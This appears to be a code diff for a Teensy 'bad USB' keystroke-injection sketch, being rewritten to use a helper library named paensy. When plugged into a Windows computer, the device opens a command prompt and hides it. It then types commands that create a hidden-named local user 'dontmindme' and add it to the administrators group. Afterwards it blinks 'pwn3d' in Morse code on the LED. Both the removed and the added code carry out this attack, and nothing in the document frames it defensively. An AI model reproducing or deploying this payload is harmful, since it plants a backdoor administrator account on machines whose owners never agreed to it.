@@ -11,173 +11,76 @@
  *    /_.___/ \__, /   \____/  /___/\__,_//_/    \__,_/          
  *           /____/                                              
  */
-
-// LED pin number, 13 for 3.1
-// 11 for 2 and 2.x
-int LED_PIN = 13;
-
-// delay length (in ms)
-int ds = 100;
-// morse delay length (in ms)
-int morseD = 250;
+ 
+#include <paensy.h>
 
 void setup() {
   
-  // let it initialize
+  // Configure the delay that everything else scales off of.
+  SetDelay(100);
+  // Configure the delay that the Morse code uses.
+  SetMorseDelay(250);
+  
+  // Perform an initial delay to give the USB time to prepare.
+  PerformInitDelay();
+  
+  // LED pin number, 13 for 3.1
+  // 11 for 2 and 2.x
+  SetLEDPin(13);
+  
+  // Put pin into output mode.
+  pinMode(GetLEDPin(), OUTPUT);
+  
+  // Turn on the LED pin so we know the drive is running.
+  digitalWrite(GetLEDPin(), HIGH);
+  
   delay(1000);
   
-  // put the pin into output mode
-  pinMode(LED_PIN, OUTPUT);
+  // Open a command prompt that is harder to see.
+  RunCommand("cmd /Q /D /T:7F /F:OFF /V:ON /K");
   
-  // turn on the LED pin so we know it's running
-  digitalWrite(LED_PIN, HIGH);
+  delay(500);
   
-  delay(1000);
+  // Hide the current window (the command prompt we just opened).
+  HideCurWindow(1080);
   
-  // windows key + R = run
-  sendCmd(KEY_R);
+  delay(500);
   
-  typeln("cmd");
-  
-  // call our epic function
-  addUser("dontmindme", "SecurePassword");
+  // Add a new admin user.
+  AddUser("dontmindme", "SecurePass");
 }
 
 void loop() {
- flutter();
- // celebratory flutterring of LED commence
- dot();
- dash();
- dash();
- dot();
- // p
- dot();
- dash();
- dash();
- //w
- dash();
- dot();
- //n
- dot();
- dot();
- dot();
- dash();
- dash();
- //3
- dash();
- dot();
- dot();
- //d
- flutter();
- // whoop there it is (again)
+ // Celebratory LED fluttering.
+ LED_Flutter(200, 10);
  
-}
-
-void addUser(String uname, String pword) {
- // you should be able to guess what this does
- typeln("net user " + uname + " /add");
- typeln("net localgroup administrators " + uname + " /add");
- typeln("net user " + uname + " *");
- typeln(pword);
- typeln(pword);
- // close the command prompt because mama always told us to clean up well
- typeln("exit");
-}
-
-void typeln(String chars)
-{
-  // gotta make our own println function
-  Keyboard.print(chars);
-  delay(ds);
-  Keyboard.println("");
-  delay(ds * 4);
-}
-
-void sendCmd(int key)
-{
-  mod(MODIFIERKEY_GUI, key);
-  delay(ds);
-}
-void ctrl(int key)
-{
-  mod(MODIFIERKEY_CTRL, key);
-}
-
-void shift(int key)
-{
-  mod(MODIFIERKEY_SHIFT, key);
-}
-
-void alt(int key)
-{
-  mod(MODIFIERKEY_ALT, key);
-}
-
-void k(int key)
-{
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(ds/2);
-  
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(ds/2);
-}
-
-
-// morse code dot
-void dot() { 
- digitalWrite(LED_PIN, HIGH);
- delay(morseD);
- digitalWrite(LED_PIN, LOW);
- delay(morseD);
-}
-
-// morse code dash
-void dash() {
- digitalWrite(LED_PIN, HIGH);
- delay(morseD * 3);
- digitalWrite(LED_PIN, LOW);
- delay(morseD);
-}
-
-// induce a seizure in the observer - #prostrats  
-void flutter() {
-  
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
+ // P
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ LED_MorseDot();
  
-}
+ // W
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // N
+ LED_MorseDash();
+ LED_MorseDot();
 
-// custom modifier method
-void mod(int mod, int key)
-{
-  Keyboard.set_modifier(mod);
-  Keyboard.send_now();
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(ds);
-
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(ds);
+ // 3
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // D
+ LED_MorseDash();
+ LED_MorseDot();
+ LED_MorseDot();
+ 
+ // Flutter again.
+ LED_Flutter(200, 10); 
 }
